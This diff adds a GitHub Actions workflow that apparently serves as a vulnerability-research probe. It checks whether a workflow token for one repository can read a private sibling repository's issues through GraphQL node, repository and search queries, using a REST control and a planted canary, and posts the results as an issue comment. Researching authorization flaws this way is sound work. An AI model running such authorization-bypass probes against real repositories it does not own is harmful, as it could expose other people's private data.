@@ -1,0 +1,67 @@
+name: apex-graphql-probe
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  issues: read
+jobs:
+  gql:
+    runs-on: ubuntu-latest
+    steps:
+      - name: GraphQL vs REST authz divergence (repo-A-scoped token reads repo-B private)
+        env:
+          GH_TOKEN: ${{ github.token }}
+          ISSUE_NODE: "I_kwDOTVPgHc8AAAABIclzFw"
+          REPO_NODE: "R_kgDOTVPgHQ"
+          OWNER: MrW0r57
+          A: apex-dep-a
+          B: apex-dep-b
+        run: |
+          set +e
+          mkdir -p /tmp/o
+          gql() { # $1 = json query file -> prints http code, body to /tmp/o/last
+            curl -s -o /tmp/o/last -w "%{http_code}" \
+              -H "Authorization: Bearer $GH_TOKEN" -H "Content-Type: application/json" \
+              -X POST --data @"$1" https://api.github.com/graphql; }
+
+          # CONTROL: REST direct read of private repo-B (must be 404)
+          RB=$(curl -s -o /tmp/o/rest -w "%{http_code}" -H "Authorization: Bearer $GH_TOKEN" \
+                -H "Accept: application/vnd.github+json" https://api.github.com/repos/$OWNER/$B/issues/1)
+
+          # T1: GraphQL node() global-object fetch of the PRIVATE issue by node id
+          jq -n --arg id "$ISSUE_NODE" '{query:"query($id:ID!){node(id:$id){__typename ... on Issue{title body repository{nameWithOwner isPrivate}}}}",variables:{id:$id}}' > /tmp/o/q1.json
+          C1=$(gql /tmp/o/q1.json); cp /tmp/o/last /tmp/o/r1
+
+          # T2: GraphQL direct repository()->issue() on the private repo
+          jq -n --arg o "$OWNER" --arg n "$B" '{query:"query($o:String!,$n:String!){repository(owner:$o,name:$n){isPrivate issue(number:1){title body}}}",variables:{o:$o,n:$n}}' > /tmp/o/q2.json
+          C2=$(gql /tmp/o/q2.json); cp /tmp/o/last /tmp/o/r2
+
+          # T3: GraphQL node() of the private repository
+          jq -n --arg id "$REPO_NODE" '{query:"query($id:ID!){node(id:$id){__typename ... on Repository{nameWithOwner isPrivate}}}",variables:{id:$id}}' > /tmp/o/q3.json
+          C3=$(gql /tmp/o/q3.json); cp /tmp/o/last /tmp/o/r3
+
+          # T4: GraphQL search across private issues
+          jq -n '{query:"{search(query:\"repo:MrW0r57/apex-dep-b\",type:ISSUE,first:5){issueCount nodes{... on Issue{title}}}}"}' > /tmp/o/q4.json
+          C4=$(gql /tmp/o/q4.json); cp /tmp/o/last /tmp/o/r4
+
+          LEAK=false
+          for f in /tmp/o/r1 /tmp/o/r2 /tmp/o/r3 /tmp/o/r4; do
+            grep -q CANARY_PRIV_9f3a1c "$f" && LEAK=true
+          done
+
+          jq -n \
+            --arg rb "$RB" --arg c1 "$C1" --arg c2 "$C2" --arg c3 "$C3" --arg c4 "$C4" \
+            --argjson leak $LEAK \
+            --rawfile b1 /tmp/o/r1 --rawfile b2 /tmp/o/r2 --rawfile b3 /tmp/o/r3 --rawfile b4 /tmp/o/r4 \
+            '{control_rest_repoB_issue_status_expect404:$rb,
+              t1_gql_node_issue_http:$c1, t1_body:($b1[0:400]),
+              t2_gql_repository_http:$c2, t2_body:($b2[0:400]),
+              t3_gql_node_repo_http:$c3, t3_body:($b3[0:300]),
+              t4_gql_search_http:$c4, t4_body:($b4[0:300]),
+              CANARY_LEAKED_VIA_GRAPHQL:$leak}' > /tmp/o/result.json
+          echo "=== APEX_GQL_RESULT ==="; cat /tmp/o/result.json
+
+          jq -n --rawfile r /tmp/o/result.json '{body:("APEX-GQL-RESULT\n\n```json\n"+$r+"\n```")}' > /tmp/o/c.json
+          curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            -d @/tmp/o/c.json https://api.github.com/repos/$OWNER/$A/issues/1/comments >/dev/null
+          echo "posted"
